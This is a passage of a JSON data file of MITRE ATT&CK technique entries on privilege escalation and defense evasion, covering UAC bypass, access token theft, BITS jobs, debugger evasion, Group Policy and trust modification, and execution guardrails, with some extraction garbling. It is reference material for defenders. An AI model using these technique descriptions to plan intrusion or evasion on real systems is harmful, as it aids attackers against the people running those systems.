    "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials throughOS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:28.288095"
  },
  {
    "technique_id": "T1548",
    "name": "Abuse Elevation Control Mechanism",
    "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.[1][2]An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:31.631014",
    "subtechniques": [
      {
        "id": "T1548.002",
        "name": "Bypass User Account Control"
      }
    ]
  },
  {
    "technique_id": "T1548.002",
    "name": "Bypass User Account Control",
    "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[1]If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevatedComponent Object Modelobjects without prompting the user through the UAC notification box.[2][3]An example of this is use ofRundll32to load a specifically crafted DLL which loads an auto-elevatedComponent Object Modelobject and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4]Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5]that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.execan auto-elevate and execute a specified binary or script.[6][7]Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.[8]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Abuse Elevation Control Mechanism",
    "parent_technique_id": "T1548",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:34.989445"
  },
  {
    "technique_id": "T1134",
    "name": "Access Token Manipulation",
    "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e.Token Impersonation/Theft) or used to spawn a new process (i.e.Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.[1]Any standard user can use therunascommand, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:38.359445",
    "subtechniques": [
      {
        "id": "T1134.001",
        "name": "Token Impersonation/Theft"
      },
      {
        "id": "T1134.002",
        "name": "Create Process with Token"
      },
      {
        "id": "T1134.003",
        "name": "Make and Impersonate Token"
      },
      {
        "id": "T1134.004",
        "name": "Parent PID Spoofing"
      },
      {
        "id": "T1134.005",
        "name": "SID-History Injection"
      }
    ]
  },
  {
    "technique_id": "T1134.001",
    "name": "Token Impersonation/Theft",
    "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token usingDuplicateTokenorDuplicateTokenEx.[1]The token can then be used withImpersonateLoggedOnUserto allow the calling thread to impersonate a logged on user's security context, or withSetThreadTokento assign the impersonated token to a thread.An adversary may performToken Impersonation/Theftwhen they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionallyCreate Process with TokenusingCreateProcessWithTokenWorCreateProcessAsUserW.Token Impersonation/Theftis also distinct fromMake and Impersonate Tokenin that it refers to duplicating an existing token, rather than creating a new one.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:41.618345"
  },
  {
    "technique_id": "T1134.002",
    "name": "Create Process with Token",
    "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such asCreateProcessWithTokenWandrunas.[1]Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated viaToken Impersonation/Theftor created viaMake and Impersonate Tokenbefore being used to create a process.While this technique is distinct fromToken Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:44.963105"
  },
  {
    "technique_id": "T1134.003",
    "name": "Make and Impersonate Token",
    "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using theLogonUserfunction.[1]The function will return a copy of the new session's access token and the adversary can useSetThreadTokento assign the token to a thread.This behavior is distinct fromToken Impersonation/Theftin that this refers to creating a new user token instead of stealing or duplicating an existing one.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:48.302704"
  },
  {
    "technique_id": "T1134.004",
    "name": "Parent PID Spoofing",
    "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via theCreateProcessAPI call, which supports a parameter that defines the PPID to use.[1]This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically viasvchost.exeorconsent.exe) rather than the current user context.[2]Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID ofPowerShell/Rundll32to beexplorer.exerather than an Office document delivered as part ofSpearphishing Attachment.[3]This spoofing could be executed viaVisual Basicwithin a malicious Office document or any code that can performNative API.[4][3]Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such aslsass.exe), causing the new process to be elevated via the inherited access token.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:51.548998"
  },
  {
    "technique_id": "T1134.005",
    "name": "SID-History Injection",
    "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.[1]An account can hold additional SIDs in the SID-History Active Directory attribute[2], allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values[3]may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such asRemote Services,SMB/Windows Admin Shares, orWindows Remote Management.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:54.797991"
  },
  {
    "technique_id": "T1197",
    "name": "BITS Jobs",
    "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed throughComponent Object Model(COM).[1][2]BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible throughPowerShelland theBITSAdmintool.[2][3]Adversaries may abuse BITS to download (e.g.Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g.Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.[4][5][6]BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).[7][4]BITS upload functionalities can also be used to performExfiltration Over Alternative Protocol.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:58.061864",
    "subtechniques": []
  },
  {
    "technique_id": "T1622",
    "name": "Debugger Evasion",
    "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.[1]Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar toVirtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary. On Windows, this may involveNative APIfunction calls such asIsDebuggerPresent()andNtQueryInformationProcess(), or manually checking theBeingDebuggedflag of the Process Environment Block (PEB). On Linux, this may involve querying/proc/self/statusfor theTracerPIDfield, which indicates whether or not the process is being traced by dynamic analysis tools.[2][3]Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).[4][5][6]Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the programâ€™s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the programâ€™s execution to continue.[7]Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by loopingNative APIfunction calls such asOutputDebugStringW().[8][9]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:01.412045",
    "subtechniques": []
  },
  {
    "technique_id": "T1140",
    "name": "Deobfuscate/Decode Files or Information",
    "description": "Adversaries may useObfuscated Files or Informationto hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use ofcertutilto decode a remote access tool portable executable file that has been hidden inside a certificate file.[1]Another example is using the Windowscopy /bortypecommand to reassemble binary fragments into a malicious payload.[2][3]Sometimes a user's action may be required to open it for deobfuscation or decryption as part ofUser Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:04.941474",
    "subtechniques": []
  },
  {
    "technique_id": "T1006",
    "name": "Direct Volume Access",
    "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools.[1]Utilities, such asNinjaCopy, exist to perform these actions in PowerShell.[2]Adversaries may also use built-in or third-party utilities (such asvssadmin,wbadmin, andesentutl) to create shadow copies or backups of data from system volumes.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:08.284759",
    "subtechniques": []
  },
  {
    "technique_id": "T1484",
    "name": "Domain or Tenant Policy Modification",
    "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:modifying GPOs to push a maliciousScheduled Taskto computers throughout the domain environment[1][2][3]modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources[4]changing configuration settings within the AD environment to implement aRogue Domain Controller.adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant[5]Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:11.629923",
    "subtechniques": [
      {
        "id": "T1484.001",
        "name": "Group Policy Modification"
      },
      {
        "id": "T1484.002",
        "name": "Trust Modification"
      }
    ]
  },
  {
    "technique_id": "T1484.001",
    "name": "Group Policy Modification",
    "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such asScheduled Task/Job,Disable or Modify Tools,Ingress Tool Transfer,Create Account,Service Execution,  and more.[2][3][4][5][6]Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.[3]For example, publicly available scripts such asNew-GPOImmediateTaskcan be leveraged to automate the creation of a maliciousScheduled Task/Jobby modifying GPO settings, in this case modifying<GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml.[3][4]In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in<GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.[7]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Domain or Tenant Policy Modification",
    "parent_technique_id": "T1484",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:14.974166"
  },
  {
    "technique_id": "T1484.002",
    "name": "Trust Modification",
    "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.[1]These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forgeSAML Tokenswithout the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.[2]An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.[3]This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Domain or Tenant Policy Modification",
    "parent_technique_id": "T1484",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:18.228824"
  },
  {
    "technique_id": "T1672",
    "name": "Email Spoofing",
    "description": "Adversaries may fake, or spoof, a senderâ€™s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.[1]In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity.This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).[2][3][4]Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such asv=DMARC1; p=none; fo=1;. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.[1][5]Adversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts[5]such asPhishing. They may also leverage email spoofing forImpersonationof legitimate external individuals and organizations, such as journalists and academics.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:21.582739",
    "subtechniques": []
  },
  {
    "technique_id": "T1480",
    "name": "Execution Guardrails",
    "description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversaryâ€™s campaign.[1]Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.[2]Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typicalVirtualization/Sandbox Evasion. While use ofVirtualization/Sandbox Evasionmay involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:24.958679",
    "subtechniques": [
      {
        "id": "T1480.001",
        "name": "Environmental Keying"
      },
      {
        "id": "T1480.002",
        "name": "Mutual Exclusion"
      }
    ]
  },
  {
    "technique_id": "T1480.001",
    "name": "Environmental Keying",
    "description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation ofExecution Guardrailsthat utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.[1]Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.[2][3][4][5][6]By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.[2][6]These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar toObfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.[2][4][5][6][7]By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.[2]This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like otherExecution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typicalVirtualization/Sandbox Evasion. While use ofVirtualization/Sandbox Evasionmay involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Execution Guardrails",
    "parent_technique_id": "T1480",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:28.305891"
  },
  {
    "technique_id": "T1480.002",
    "name": "Mutual Exclusion",
    "description": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.[1]While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.[1]By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.[2]In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.[3][4]Mutex names may be hard-coded or dynamically generated using a predictable algorithm.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Execution Guardrails",
    "parent_technique_id": "T1480",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:31.654853"
  },
  {
    "technique_id": "T1211",
    "name": "Exploitation for Defense Evasion",
    "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Â Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised forSecurity Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries[1], evade security logs[2], or deploy hidden infrastructure.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:34.985222",
    "subtechniques": []
  },
  {
    "technique_id": "T1222",
    "name": "File and Directory Permissions Modification",
    "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directoryâ€™s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence viaAccessibility Features,Boot or Logon Initialization Scripts,Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files viaHijack Execution Flow.Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.[3][4][5][6][7]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:38.383519",
    "subtechniques": [
      {
        "id": "T1222.001",
        "name": "Windows File and Directory Permissions Modification"
      }
    ]
  },
  {
    "technique_id": "T1222.001",
    "name": "Windows File and Directory Permissions Modification",
    "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).[3]Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.[4]Adversaries can interact with the DACLs using built-in Windows commands, such asicacls,cacls,takeown, andattrib, which can grant adversaries higher permissions on specific files and folders. Further,PowerShellprovides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence viaAccessibility Features,Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files viaHijack Execution Flow.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "File and Directory Permissions Modification",
    "parent_technique_id": "T1222",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:41.722163"
  },
  {
    "technique_id": "T1564",
    "name": "Hide Artifacts",
    "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.[1][2][3]Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:45.085153",
    "subtechniques": [
